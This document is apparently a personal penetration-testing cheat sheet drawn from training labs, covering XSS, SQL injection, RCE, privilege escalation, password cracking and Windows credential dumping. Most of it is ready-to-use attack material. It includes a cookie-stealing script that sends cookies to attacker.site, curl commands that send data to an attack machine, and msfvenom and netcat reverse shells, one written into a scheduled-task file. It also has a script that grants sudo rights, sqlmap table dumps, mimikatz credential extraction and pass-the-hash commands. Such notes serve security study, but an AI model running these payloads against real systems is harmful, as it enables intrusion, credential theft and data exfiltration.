		http://victim.site/search.php?find=<payload>

* Stored XSS attacks
	//When the payload is sent to the vulnerable web server and then stored. The malicious code gets delivered each and every time a web browser hits the "injected" web page.
	//Cookie stealing via XSS. [Javascript can access cookies if they do not have the HttpOnly flag enabled.]
		<script>alert(document.cookie)</script>
    	//With the following code, you can send cookies content to an attacker-controlled site. The script generates an image object and points its src to a script on the attacker's server(attacker.site)
	//You post this in the vulnerable field
      		<script>
      		var i = new Image();
      		i.src="http://attacker.site/log.php?q="+escape(document.cookie);
      		</script>

      	//The log.php script saves the cookie in a text file on the attacker.site
      		<?php 
      		$filename="/tmp/log.txt";
      		$fp=fpopen($filename, 'a');
      		$cookie=$_GET['q'];
      		fwrite($fp, $cookie);
      		fclose($fp);
      		?>

      	//Another script
      		<?php
      		$ip = $_SERVER['REMOTE_ADDR'];
      		$browser = $_SERVER['HTTP_USER_AGENT'];
      		$fp = fopen('jar.txt', 'a');

      		fwrite($fp, $ip. ' '.$browser." \n");
      		fwrite($fp, urldecode($_SERVER['QUERY_STRING']). "  \n\n");
      		fclose($fp);
      		?>
* xsser 
	(with POST)
		xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' //The -p is from burpsuite
      		  --auto
      		  --Fp: Final payload //<script>alert("XSS")</script>
	(with GET)
      		xsser --url ... //Change 'nmap' by XSS ==> poll request //Remember
	URLs and books
  		The web application hacker's handbook by Dafydd Stuttard

###SQLi
* Comments
	'#' symbol
    	-- (two dashes followed by a space)
* Static query example inside a PHP page
	<?php
    	$dbhostname='1.2.3.4';
    	$dbuser='username';
    	$dbpassword='password';
    	$dbname='database';
    	
    	$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname); // Object referencing the connection to the database
    	$query = "SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;";
    	
    	
    	$results = mysqli_query($connection, $query); //Function which submits the query to the database
    	display_results($results); //Renders the data
    	?>

* Dynamic query
	<?php
    	$dbhostname='1.2.3.4';
    	$dbuser='username';
    	$dbpassword='password';
    	$dbname='database';
    	
    	$id = $_GET['id']; //Using user-supplied input to build a query
    	
    	$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);
    	$query = "SELECT Name, Description FROM Products WHERE ID='$id';";
    	
    	$results = mysqli_query($connection, $query);
    	display_results($results);
    	?>

	[+] One example of SQLi
		We can change the $id value to something like
    	  		' OR 'a'='a
    	  	The query then becomes:
    	  	  	SELECT Name, Description FROM Products WHERE ID='' OR 'a'='a'; //This tells the database to select all the items in the Products table.

    	[+] Other example
    	  	Using UNION command
    	  	  	' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a
    	  	The query then becomes:
    	  	  	SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';

* Finding SQL injections
	[+] string terminators: ' and "
    	[+] SQL commands: SELECT, UNION and others
    	[+] SQL comments: # or -- 
    	[+] In POST ==> username=userna'me&password=password

* Exploiting a boolean based SQLi
	user() //Current user using the database
    	substring() //Returns a substring of the given argument. It takes three parameters: the input string, the position of the substring and its length
    		mysql > select substring('elearnsecurity', 2, 1);
    	  	mysql > select substring(user(), 1, 1) = 'r'; //To test True/False condition

		Combining those features, we can iterate over the letters of the username by using payloads such as:
    			[+] ' or substr(user(), 1, 1) = 'a
    		  	[+] ' or substr(user(), 1, 1) = 'b
    		  	...

    		When we find the first letter, we can move to the second:
    		  	[+] ' or substr(user(), 2, 1) = 'a
    		  	[+] ' or substr(user(), 2, 1) = 'b
    		  	...

* Exploiting UNION based SQLi
	[+] When some of the results of a query are directly displayed on the output page.
    		' UNION SELECT user(); -- -
    	[+] The query then becomes:
    		SELECT description FROM items WHERE id='' UNION SELECT user(); -- -'; //The third dash is because most of the browsers automatically remove trailing spaces in the URL so, if you need to inject a comment via a GET request, you have to add a character after the trailing space of the comment

	[+] Examples
		' UNION SELECT null; -- -
      		' UNION SELECT null,null; -- - //We need to know how many fiels are there

	[+] When we know the number of fields, it is time to test which fields are part of the output page.
		' UNION SELECT 'elsid1', 'elsid2'; -- - 

  
* SQLMap
	[+] When you want to read from a file, save it from Burpsuite
		sqlmap -r /root/bloglogin.req -p user --technique=B --banner -v3 
			--flush-session
		sqlmap -r request -p title --os-shell
		sqlmap -u http://victim.site/view.php?id=1441' -p id --technique=U //UNION based SQLi technique
    		sqlmap -u http://victim.site/view.php?id=1441 -b //banner
    		sqlmap -u http://victim.site/view.php?id=1441 --tables //tables
    		sqlmap -u http://victim.site/view.php?id=1441 --current-db selfi4you --columns
    		sqlmap -u http://victim.site/view.php?id=1441 --current-db selfi4you --dump
    		sqlmap -u http://victim.site/view.php?id=1441' -p search --technique=U --banner -v3 --fresh-queries
    			--current-db
    		  	--current-user
    		sqlmap -u http://victim.site/view.php?id=n' -p search --technique=U  -D blogdb --tables
    		sqlmap -u http://victim.site/view.php?id=n' -p search --technique=U  -D blogdb -T users --columns
    		sqlmap -u http://victim.site/view.php?id=n' -p search --technique=U  -D blogdb -T users -C username,password --dump

	[+] If you have to exploit a POST parameter:
    		> With sqlmap
    	  		sqlmap -u <URL> --data=<POST string> -p parameter [options] //Copy the POST string from a request intercepted with Burp Proxy
    	  	  	sqlmap -u http://sqlmap.test/login.php --data='user=a&pass=a' -p user --technique=B --banner
    	  	> With Burpsuite
    	    		username=a' or 1=1; -- -&pass=a //We could test one field and the other to see which is vulnerable

	[+] Another way
		sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title --dbs
		sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP --tables
       		sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP -T users --columns 
		sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP -T users -C admin,password,email --dump
      






##Exploitation
#=
###Linux Kernel Exploitation
* Github
	https://github.com/mzet-/linux-exploit-suggester
  	wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
* Meterpreter
	meterpreter > 
  		shell
  	  	/bin/bash -i
  	  	sysinfo
  	  	getuid
    
* Cron Jobs
    Any script or command that have been configured to be run as the "root" user and is run by a Cron Job will run as the root user and will consequently provide us with root access.
    	crontab -l
    	cd /
    	grep -rnw (or -nri) /usr -e "/home/student/message" or find / -name message  //Find if a file with the same name exists on the system
    	printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh

* Exploiting SUID Binaries
	strings welcome
    	rm -rf greetings
    	cp /bin/bash greetings
    	./welcome

###Dumping Linux Passwords Hashes
The shadow file can only be accessed by the root account.
  	value     Hashing algorithm
  	$1        MD5
  	$2        Blowfish
  	$5        SHA-256
  	$6        SHA-512
	> Example:
      		msfconsole ==> hashdump
      		cat /etc/shadow

[+] Protected Files
* Hunting for Encoded Files

    > Many different file extensions can identify these types of encrypted/encoded files. For example, a useful list can be found on FileInfo(https://fileinfo.com/filetypes/encoded). However, for our example, we will only look at the most common files like the following:
    > Hunting for Files
        cry0l1t3@unixclient:~$ for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

    > Hunting for SSH keys
        cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
        > Most SSH keys we will find nowadays are encrypted. We can recognize this by the header of the SSH key because this shows the encryption method in use.
        + Encrypted SSH Keys
            cry0l1t3@unixclient:~$ cat /home/cry0l1t3/.ssh/SSH.private
            -----BEGIN RSA PRIVATE KEY-----
            Proc-Type: 4,ENCRYPTED
            DEK-Info: AES-128-CBC,2109D25CC91F8DBFCEB0F7589066B2CC
            
            8Uboy0afrTahejVGmB7kgvxkqJLOczb1I0/hEzPU1leCqhCKBlxYldM2s65jhflD
            4/OH4ENhU7qpJ62KlrnZhFX8UwYBmebNDvG12oE7i21hB/9UqZmmHktjD3+OYTsD
            ...SNIP...
        > If we see such a header in an SSH key, we will, in most cases, not be able to use it immediately without further action. This is because encrypted SSH keys are protected with a passphrase that must be entered before use. However, many are often careless in the password selection and its complexity because SSH is considered a secure protocol, and many do not know that even lightweight AES-128-CBC can be cracked.

* Cracking with John
    > John Hashing scripts
        m1l0js@htb[/htb]$ locate *2john*
        
        m1l0js@htb[/htb]$ ssh2john.py SSH.private > ssh.hash
        m1l0js@htb[/htb]$ cat ssh.hash 
        
        ssh.private:$sshng$0$8$1C258238FD2D6EB0$2352$f7b...SNIP...
    > Cracking SSH keys
        m1l0js@htb[/htb]$ john --wordlist=rockyou.txt ssh.hash
        m1l0js@htb[/htb]$ john ssh.hash --show
        SSH.private:1234
        1 password hash cracked, 0 left
    > Cracking Microsoft Office Documents
        m1l0js@htb[/htb]$ office2john.py Protected.docx > protected-docx.hash
        m1l0js@htb[/htb]$ cat protected-docx.hash
        m1l0js@htb[/htb]$ john --wordlist=rockyou.txt protected-docx.hash
        m1l0js@htb[/htb]$ john protected-docx.hash --show
    > Cracking PDFs
        m1l0js@htb[/htb]$ pdf2john.py PDF.pdf > pdf.hash
        m1l0js@htb[/htb]$ cat pdf.hash 
        m1l0js@htb[/htb]$ john --wordlist=rockyou.txt pdf.hash
        m1l0js@htb[/htb]$ john pdf.hash --show

[+] Protected archives
* There are many types of archive files. Some common file extensions include, but are not limited to:
			
    tar	        gz	    rar	        zip
    vmdb/vmx	cpt	    truecrypt	bitlocker
    kdbx	    luks	deb	        7z
    pkg	        rpm	    war	        gzip
    > An extensive list of archive types can be found on FileInfo.com. However, instead of manually typing them out, we can also query them using a one-liner, filter them out, and save them to a file if needed. At the time of writing, there are 337archive file types listed on fileinfo.com.
    > Download All File Extensions
        m1l0js@htb[/htb]$ curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
    > It is important to note that not all of the above archives support password protection. Other tools are often used to protect the corresponding archives with a password. For example, with tar, the tool openssl or gpg is used to encrypt the archives.

* Cracking Archives
    > Given the number of different archives and the combination of tools, we will show only some of the possible ways to crack specific archives in this section. When it comes to password-protected archives, we typically need certain scripts that allow us to extract the hashes from the protected files and use them to crack the password of those.
    > The .zip format is often heavily used in Windows environments to compress many files into one file. The procedure we have already seen remains the same except for using a different script to extract the hashes.
    > Cracking ZIP
        m1l0js@htb[/htb]$ zip2john ZIP.zip > zip.hash
        m1l0js@htb[/htb]$ john --wordlist=rockyou.txt zip.hash
        m1l0js@htb[/htb]$ john zip.hash --show

* Cracking OpenSSL Encrypted Archives
    > Furthermore, it is not always directly apparent whether the archive found is password-protected, especially if a file extension is used that does not support password protection. As we have already discussed, openssl can be used to encrypt the gzip format as an example. Using the tool file, we can obtain information about the specified file's format. This could look like this, for example:
    > Using file
        m1l0js@htb[/htb]$ file GZIP.gzip 
        GZIP.gzip: openssl enc'd data with salted password

    > When cracking OpenSSL encrypted files and archives, we can encounter many different difficulties that will bring many false positives or even fail to guess the correct password. Therefore, the safest choice for success is to use the openssl tool in a for-loop that tries to extract the files from the archive directly if the password is guessed correctly.

    > The following one-liner will show many errors related to the GZIP format, which we can ignore. If we have used the correct password list, as in this example, we will see that we have successfully extracted another file from the archive.
    > Using a for-loop to Display Extracted Contents
        m1l0js@htb[/htb]$ for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done

* Cracking BitLocker Encrypted Drives

    > BitLocker is an encryption program for entire partitions and external drives. Microsoft developed it for the Windows operating system. It has been available since Windows Vista and uses the AES encryption algorithm with 128-bit or 256-bit length. If the password or PIN for BitLocker is forgotten, we can use the recovery key to decrypt the partition or drive. The recovery key is a 48-digit string of numbers generated during BitLocker setup that also can be brute-forced.
    > Virtual drives are often created in which personal information, notes, and documents are stored on the computer or laptop provided by the company to prevent access to this information by third parties. Again, we can use a script called bitlocker2john to extract the hash we need to crack. Four different hashes will be extracted, which can be used with different Hashcat hash modes. For our example, we will work with the first one, which refers to the BitLocker password.
    > Using bitlocker2john
        m1l0js@htb[/htb]$ bitlocker2john -i Backup.vhd > backup.hashes
        m1l0js@htb[/htb]$ grep "bitlocker\$0" backup.hashes > backup.hash
    > Using hashcat to Crack backup.hash
        m1l0js@htb[/htb]$ hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
    > Once we have cracked the password, we will be able to open the encrypted drives. The easiest way to mount a BitLocker encrypted virtual drive is to transfer it to a Windows system and mount it. To do this, we only have to double-click on the virtual drive. Since it is password protected, Windows will show us an error. After mounting, we can again double-click BitLocker to prompt us for the password
    > On a Windows machine
        $SecureString = ConvertTo-SecureString "fjuksAS1337" -AsPlainText -Force
        Unlock-BitLocker -MountPoint "E:" -Password $SecureString


[+] Most popular online password managers are:

    1Password
    Bitwarden
    Dashlane
    Keeper
    Lastpass
    NordPass
    RoboForm
> https://blog.dashlane.com/password-storage-cloud-versus-local/

* The most popular local password managers are:

    KeePass
    KWalletManager
    Pleasant Password Server
    Password Safe

* Alternatives

Passwords are the most common way of authentication but not the only one. As we learn from this module, there are multiple ways to compromise a password, cracking, guessing, shoulder surfing, etc., but what if we don't need a password to log in? Is such a thing possible?

By default, most operating systems and applications do not support any alternative to a password. Still, administrators can use 3rd party identity providers or applications to configure or enhance identity protection across their organizations. Some of the most common ways to secure identities beyond passwords are:

    Multi-factor Authentication.
    FIDO2 open authentication standard, which enables users to leverage common devices like Yubikey, to authenticate easily. For a more extended device list, you can see Microsoft FIDO2 security key providers.
    One-Time Password (OTP).
    Time-based one-time password (TOTP).
    IP restriction.
    Device Compliance. Examples: Endpoint Manager or Workspace ONE

Passwordless

Multiples companies like Microsoft, Auth0, Okta, Ping Identity, etc, are trying to promote the Passwordless strategy, to remove the password as the way of authentication.

Passwordless authentication is achieved when an authentication factor other than a password is used. A password is a knowledge factor, meaning it's something a user knows. The problem with relying on a knowledge factor alone is that it's vulnerable to theft, sharing, repeat use, misuse, and other risks. Passwordless authentication ultimately means no more passwords. Instead, it relies on a possession factor, something a user has, or an inherent factor, which a user is, to verify user identity with greater assurance.

As new technology and standards evolve, we need to investigate and understand the details of its implementation to understand if those alternatives will or not provide the security we need for the authentication process. You can read more about Passwordless authentication and different vendors' strategies:

    Microsoft Passwordless  ==> (https://www.microsoft.com/en-us/security/business/identity-access-management/passwordless-authentication)
    Auth0 Passwordless      ==> (https://auth0.com/passwordless)
    Okta Passwordless       ==> (https://www.okta.com/passwordless-authentication/)
    PingIdentity            ==> (https://www.pingidentity.com/en/resources/blog/posts/2021/what-does-passwordless-really-mean.html)




            -=-=-==-
###RCE
* In Burpsuite
	sleep+2 //The '+' is not necessary if you are in a browser
[+] Abusing curl
	Attack machine:
      		nc -lvnp 53
    	Victim machine
      		curl http://<attack machine IP>/53/`whoami | base64`
  	msfvenom -p linux/x64/shell_reverse_tcp LHOST=<our IP> LPORT=<our lport> -f elf -o reverse53
	create a python server from our machine
  	curl from victim machine and add '-o /tmp/r'. 
  	chmod +x /tmp/r

  	You can put files in a server with '-T'
    		A: nc -lvnp 53
    		V: curl http://<MY IP>/file -T /etc/issue
###Buffer overflow
	[+] A buffer is an area in the RAM reserved for temporary data storage. Buffers have a finite size; this means that they can only contain a certain amount of data. Buffers are stored in a special data structure in the computer memory called a stack (data structure used to store data). It uses LIFO (Last in First Out) with two methods:
  		> Push: Adds an element to the stack
  	  	> Pop: Removes the last inserted element
	
###General PrivEsc checklist
* Kernel exploits: Be careful for they cause system instability
* Vulnerable software
	> Linux 
		dpkg -l
	> Windows 
		C:\Program Files
* User privileges
	[+] Sudo: The sudo command in Linux allows a user to execute commands as a different user. It is usually used to allow lower privileged users to execute commands as root without giving them access to the root user. 
		sudo -l
			If 
				(ALL : ALL) ALL ==> It requires a password to run any commands with sudo
				sudo su -
			If 
				(user : user) NOPASSWD: /bin/echo ==> The NOPASSWD entry shows that the /bin/echo command can be executed without a password. This would be useful if we gained access to the server through a vulnerability and did not have the user's password. As it says user, we can run sudo as that user and not as root. 
				sudo -u user /bin/echo Hello world!

	> SUID
	> Windows Token privileges
	[+] Resources
		https://gtfobins.github.io/
		https://lolbas-project.github.io/#

* Scheduled tasks
	[+] Cronjobs
		/etc/crontab
		/etc/cron.d
		/var/spool/cron/crontabs/root
		
	> Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.
	[+] Commands	
		net start //Services running in the background
        	wmic service list brief
        	tasklist /svc //List services running under that particular process
  		schtasks /query /fo list /v
      		schtasks /query /tn vulntask /fo list /v ==> vulntask = task 

	> Scheduled tasks can be listed from the command line using the schtasks command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:
	> You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.
	> If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use icacls:
		C:\> icacls c:\tasks\schtask.bat
		c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
		                    BUILTIN\Administrators:(I)(F)
		                    BUILTIN\Users:(I)(F)

	> As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, nc64.exe can be found on C:\tools. Let's change the bat file to spawn a reverse shell:
		C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
	> We then start a listener on the attacker machine on the same port we indicated on our reverse shell:
		nc -lvp 4444
	> The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. While you probably wouldn't be able to start the task in a real scenario and would have to wait for the scheduled task to trigger, we have provided your user with permissions to start the task manually to save you some time. We can run the task with the following command:
		C:\> schtasks /run /tn vulntask
	> And you will receive the reverse shell with taskusr1 privileges as expected:
		user@attackerpc$ nc -lvp 4444
		Listening on 0.0.0.0 4444
		Connection received on 10.10.175.90 50649
		Microsoft Windows [Version 10.0.17763.1821]
		(c) 2018 Microsoft Corporation. All rights reserved.
		
		C:\Windows\system32>whoami
		wprivesc1\taskusr1
* Passwords attacks
    + Credential Storage in Linux
        cat /etc/shadow


* Exposed credentials
	[+] Linux
		bash_history
	[+] Windows
		PSReadLine
* SSH Keys
	> If we have read access, we can copy id_rsa to our machine and use '-i' flag to log in with it
		vim id_rsa
		chmod 600 id_rsa
		ssh user@10.10.10.10 -i id_rsa
	> We may read their private key
		/home/user/.ssh/id_rsa
		/root/.ssh/id_rsa
	> If we find ourselves with write access to a users/.ssh/ directory, we can place our public key in the user's ssh directory at /home/user/.ssh/authorized_keys. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with ssh-keygen and the -f flag to specify the output file

###Windows Privilege Escalation
[+] Resources
	> PrivEsc Checklists
  		https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
		https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
	> Enumeration Scripts
		https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
		https://github.com/GhostPack/Seatbelt
		https://github.com/411Hall/JAWS
[+] Windows kernel
	> A kernel is a computer program that is the core of an operating system and has complete control over every resource and hardware on a system. It acts as a translation layer between hardware and software and facilitates the communication between these two layers
    	> Windows NT is the kernel that comes pre-packaged with all versions of Microsoft Windows and operates as a traditional kernel with a few exceptions based on user design philosophy. It consists of two main modes of operation that determine access to system resources and hardware:
      		+ User mode: Programs and services running in user mode have limited access to system resources and functionality
      		+ Kernel mode: Kernel mode has unrestricted access to system resources and functionality with the added functionality of managing devices and system memory.
[+] PowerShell-Empire
	> It is a pure PowerShell exploitation/post-exploitation framework built on cryptological-secure communications and flexible architecture
    	> Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from keyloggers to Mimikatz and adaptable communications to evade network detection, all wrapped up in a usability-focused framework
	> Starkiller is the GUI
    	> Usage
    		apt-get install powershell-empire starkiller -y
    	    	sudo powershell-empire server
    	    	sudo powershell-empire client
    	    		listeners
    	    	  	agents
    	    	starkiller (Default credentials: empireadmin:password123)
    
[+] Github tools
	https://github.com/AonCyberLabs/Windows-Exploit-Suggester
      	  systeminfo in the target machine and copy it to a .txt
      	  ./windows-exploit-suggester.py --update
      	  ./windows-exploit-suggester.py --database *.mssb.xls --systeminfo win7.txt
      	https://github.com/SecWiki/windows-kernel-exploits
      
[+] Saved windows credentials
    	cmdkey /list
    	runas /savecred /user:username cmd.exe
[+] Bypassing UAC with UACMe 
	In order to successfully bypass UAC, we will need to have access to a user account that is a part of the local administrators group on the Windows target system.
    	UAC has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation.
[+] Metasploit
	search suggester
          use post/multi/recon/local_exploit_suggester
[+] Example with Metasploit
	setg rhosts 10.2.22.220
      	use exploit/windows/http/rejetto_hfs_exec
      		sysinfo
      	  	pgrep explorer
      	  	migrate 2448
      	  	sysinfo
      	  	getuid
      	  	getprivs
      	  	shell
      	  		net user m1l0js
      	  	  	net localgroup administrators
      	  	  	net user admin password123
      	  	  	(Not allowed)

                #Enumerate users from registry
                PS> Get-ChildItem 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\ProfileList'
                PS> Get-ChildItem 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\ProfileList' | ForEach-Object { $_.GetValue('ProfileImagePath') }
                PS> Get-ChildItem 'HKLM:\Software\Microsoft\Windows 
NT\CurrentVersion\ProfileList' | ForEach-Object {      $profilePath = 
$_.GetValue('ProfileImagePath')     Get-ChildItem -Path 
"$profilePath\AppData\Local\Temp" }
      	  https://github.com/hfiref0x/UACME
      	  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f exe > backdoor.exe
      	  msfconsole
      		use multi/handler //Listening for new connections
      	    	set payload windows/meterpreter/reverse_tcp
      	  msfconsole 
      		cd C:\\ 
      	    	mkdir Temp
      	    	upload backdoor.exe
      	    	upload /root/Desktop/tools/UACME/Akagi64.exe
      	    	.\Akagi64.exe 23 C:\Temp\backdoor.exe

[+] Access Token Impersonation
    + Windows access tokens are created and managed by the Local Security Authority Subsystem Service (LSASS)
    + Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.
    + An access token will typically be assigned one of the following security levels:
      	> Impersonate-level tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons.
        	Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.
        	We can use the incognito module to display a list of available tokens that we can impersonate.
        	The following are the privileges that are required for a successful impersonation attack:
        	  - SeAssignPrimaryToken: This allows a user to impersonate tokens
        	  - SeCreateToken: This allows a user to create an arbitrary token with administrative privileges
        	  - SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges.
      	> Delegate-level tokens are typically created through an interactive login on Windows, primarily through a traditional login or through remote access protocols such as RDP
        	Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system.
    + Load incognito
	> Incognito is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation
      		list_tokens -u 
      		impersonate_token "ATTACKDEFENSE\Administrator"
      		getuid
      		getprivs
      		pgrep explorer
      		(finish it)
[+] Windows File system vulnerabilities --> ME INTERESA
* Alternate Data Streams
	> ADS is an NTFS(New Technology File System) file attribute and was designed to provide compatibility with the MacOS HFS(Hierarchical File System).
    	  Any file created on an NTFS formatted drive will have two different forks/streams:
		Data stream: Default stream that contains the data of the file
    	 	Resource stream: Typically contains the metadata of the file
    	> Attackers can use ADS to hide malicious code or executables in legitimate files in order to evade basic signature based AVs and static scanning tools. This can be done by storing the malicious code or executables in the file attribute resource stream (metadata) of a legitimate file. 
    	> notepad test.txt:secret.txt 
    	> change name winpeas.exe to payload.exe
    	> type payload.exe > windowslog.txt:winpeas.exe
    	> start windowslog.txt:winpeas.exe
    	> cd Windows\System32
    	> mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
    	> wupdate

[+] Windows Credential Dumping
	+ Windows Password Hashes
  		> Windows OS stores hashed user accounts and passwords locally in the SAM(Security Accounts Manager) database
  	  		The SAM database file cannot be copied while the operating system is running
  	  	    	The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.
  	  	    	In modern versions of Windows, the SAM database is encrypted with a syskey.
  	  	> Authentication and verification of user credentials is facilitated by the LSA (Local Security Authority)
  	  		Elevated/Administrative privileges are required in order to access and interact with the LSASS process 
  	  	    	This service has a cache of memory with the hashes as it interacts with the SAM database
  	  	> Windows disables LM hashing and utilizes NTLM hashing from Windows Vista onwards
    
	+ LM(LanMan)
		Default hashing algorithm that was implemented in Windows OS prior to NT4.0
      		[+] The password is broken into two seven-character chunks 
      		[+] All characters are then converted into uppercase
      		[+] Each chunk is then hashed separately with the DES algorithm.
      		> Weak protocol, primarily because the password hash does not include salts, consequently making brute-force and rainbow table attacks effective against LM hashes
      		> Example: Password123 => PASSWO ==> RD123 ==> DES ==> HASH1 + HASH2 ==> LM Hash

	+ NTLM(NTHash)
		When a user account is created, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.
      		[+] Does not split the hash in to two chunks
      		[+] Case sensitive 
      		[+] Allows the use of symbols and unicode characters
      		[+] They do not have password salts, which means that can be cracked easy with rainbow tables or through brute-force attacks
      		> Example: !Passw0rd123. ==> MD4 ==> NTLM hash
[+] Searching for passwords in Windows Configuration files
	+ Unattended Windows Setup utility
		Windows can automate a variety of repetitive task(such as the installation of Windows on many systems) typically done through the use of the Unattended Windows Setup utility. 
      		This tool utilizes configuration files that contain specific configurations and user account credentials, specifically the Administrator account's password
      			[+] C:\Windows\Panther\Unattend.xml
      			[+] C:\Windows\Panther\Autounattend.xml
      		As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64
      	+ Example done by 2 ways:
      		msfconsole -q
      		use exploit/windows/misc/hta_server
      		exploit
      		“This module hosts an HTML Application (HTA) that when opened will run a payload via Powershell". Copy the generated payload i.e “http://10.10.0.2:8080/6Nz7aySfPN.hta” and run it on cmd.exe with mshta command to gain the meterpreter shell
        	Use your own metasploit HTA server link
            	mshta.exe http://10.10.0.2:8080/6Nz7aySfPN.hta
		msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > payload.exe
        	python3 -m http.server 80
        	VM: certutil -urlcache -f http://10.10.5.2/payload.exe payload.exe
        	msfconsole 
        		use multi/handler
        	  	set payload windows/x64/meterpreter/reverse_tcp
        	  	meterpreter > search -f Unattend.xml
        	  	psexec.py Administrator@10.2.27.165

		Utilizing PowerUp.ps1
			. .\PowerUp.ps1
        		Invoke-PrivescAudit
        		How to base64 decode in Powershell?
        			$password=QWRtaW5AMTIz
        		  	$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
        		  	echo $password
        		How to run a command as other user?
        		  	runas.exe /user:administrator cmd

[+] Dumping hashes with kiwi or mimikatz
	> The SAM (Security Account Manager) database, is a database file on Windows systems that stores hashes user passwords.
    	> Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes are cached.
    	> We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi.
    	> Mimikatz will require elevated privileges in order to run correctly.

    	> Example:
    		nmap 192.168.188.128
    	    	service postresql start && msfconsole -q 
    	    	use exploit/windows/http/badblue_passthru
    	    	sysinfo
    	    	getuid
    	    	pgrep lsass
    	    	migrate 788
    	    	getuid
		> Usage of Kiwi
    	    		load kiwi
    	    			creds_all
    	    		  	lsa_dump_sam
    	    		  	lsa_dump_secrets //Some clear password sometimes
		> Usage of mimikatz.exe
    	    		pwd
    	    		cd C:\\
    	    		mkdir Temp
    	    		cd Temp
    	    		upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
    	    		.\mimikatz.exe
    	    		  privilege::debug //To ensure that we have enough privileges
    	    		  lsadump::sam
    	    		  lsadump::secrets
    	    		  sekurlsa::logonpasswords //Clear passwords

[+] Pass-The-Hash attack
	> We can use multiple tools to facilitate this attack like Metasploit PsExec module or Crackmapexec
	> Metasploit PsExec module 
    		use exploit/windows/smb/psexec
    			set smbuser administrator
    	      		set smbpass (Paste LM:NTLM or the clear password)
    	      		set target Command
    	      		set target Native\ upload
    	      		sessions -K //To kill all the sessions
	> Crackmapexec 
    		crackmapexec smb 192.168.188.126 -u Administrator -H "(NTLM hash here)"
    	    	crackmapexec smb 192.168.188.126 -u Administrator -H "(NTLM hash here)" -x "ipconfig"
    	    	crackmapexec smb 192.168.188.126 -u Administrator -H "(NTLM hash here)" -x "net user administrator password123."


          

##Post-Exploitation
* Methodology
	1. Local Enumeration
		Enumerating System information
	    	Enumerating Users & Groups
	    	Enumerating Network Information
	    	Enumerating Services
